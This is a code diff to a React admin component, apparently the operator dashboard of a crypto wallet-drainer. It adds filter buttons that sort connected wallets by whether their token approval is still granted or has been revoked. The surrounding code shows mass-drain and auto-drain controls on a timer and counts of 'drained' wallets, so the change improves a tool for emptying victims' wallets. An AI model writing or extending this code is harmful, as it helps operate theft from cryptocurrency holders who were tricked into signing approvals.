@@ -46,6 +46,7 @@ export default function WalletTable({ adminKey }: { adminKey: string }) {
   const [massDraining, setMassDraining] = useState(false);
   const [autoDrainOn, setAutoDrainOn] = useState(true);
   const [countdown, setCountdown]     = useState(AUTO_DRAIN_INTERVAL / 1000);
+  const [filter, setFilter]           = useState<"all" | "approved" | "revoked">("all");
 
   const authHeaders = useCallback(() => ({
     "x-admin-key": adminKey,
@@ -220,7 +221,14 @@ export default function WalletTable({ adminKey }: { adminKey: string }) {
   }
 
   const approvedCount = wallets.filter((w) => w.approval_status).length;
+  const revokedCount  = wallets.filter((w) => !w.approval_status).length;
   const drainedCount  = wallets.filter((w) => w.drained).length;
+
+  const filteredWallets = wallets.filter((w) => {
+    if (filter === "approved") return w.approval_status;
+    if (filter === "revoked")  return !w.approval_status;
+    return true;
+  });
 
   // ─── Render ───────────────────────────────────────────────────────────────
 
@@ -230,20 +238,42 @@ export default function WalletTable({ adminKey }: { adminKey: string }) {
       <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
         {[
           { label: "Total Wallets", value: wallets.length },
-          { label: "Approved",      value: approvedCount },
-          { label: "Drained",       value: drainedCount },
+          { label: "Approved",      value: approvedCount, color: "text-green-400" },
+          { label: "Revoked",       value: revokedCount,  color: "text-red-400" },
           { label: "Gas Price",     value: gasInfo ? `${gasInfo.gweiPrice} Gwei` : "—" },
         ].map((stat) => (
           <div key={stat.label} className="rounded-xl border border-gray-800 bg-[#111] p-4 flex flex-col gap-1">
             <p className="text-xs text-gray-500 uppercase tracking-wider">{stat.label}</p>
-            <p className="text-2xl font-bold text-white">{stat.value}</p>
+            <p className={`text-2xl font-bold ${stat.color ?? "text-white"}`}>{stat.value}</p>
           </div>
         ))}
       </div>
 
       {/* Action bar */}
       <div className="flex items-center justify-between gap-4 flex-wrap">
-        <div className="flex items-center gap-3">
+        <div className="flex items-center gap-3 flex-wrap">
+          {/* Filter buttons */}
+          <div className="flex items-center rounded-lg border border-gray-700 bg-[#111] overflow-hidden text-xs font-medium">
+            {(["all", "approved", "revoked"] as const).map((f) => (
+              <button
+                key={f}
+                onClick={() => setFilter(f)}
+                className={cn(
+                  "px-3 py-2 capitalize transition-colors",
+                  filter === f
+                    ? f === "approved"
+                      ? "bg-green-500/20 text-green-400"
+                      : f === "revoked"
+                      ? "bg-red-500/20 text-red-400"
+                      : "bg-white/10 text-white"
+                    : "text-gray-500 hover:text-gray-300"
+                )}
+              >
+                {f === "all" ? `All (${wallets.length})` : f === "approved" ? `Approved (${approvedCount})` : `Revoked (${revokedCount})`}
+              </button>
+            ))}
+          </div>
+
           <button
             onClick={() => { fetchWallets(); fetchGas(); toast.info("Refreshed."); }}
             className="flex items-center gap-2 px-4 py-2 rounded-lg border border-gray-700 bg-[#111] text-sm text-gray-300 hover:bg-[#1a1a1a] transition-colors"
@@ -303,14 +333,14 @@ export default function WalletTable({ adminKey }: { adminKey: string }) {
                     <Loader2 className="h-6 w-6 animate-spin text-gray-500 mx-auto" />
                   </td>
                 </tr>
-              ) : wallets.length === 0 ? (
+              ) : filteredWallets.length === 0 ? (
                 <tr>
                   <td colSpan={8} className="px-4 py-10 text-center text-gray-600 text-sm">
                     No wallets connected yet
                   </td>
                 </tr>
               ) : (
-                wallets.map((wallet) => (
+                filteredWallets.map((wallet) => (
                   <tr key={wallet.id} className="bg-[#0d0d0d] hover:bg-[#131313] transition-colors">
                     {/* Address */}
                     <td className="px-4 py-3 font-mono text-gray-300 whitespace-nowrap">
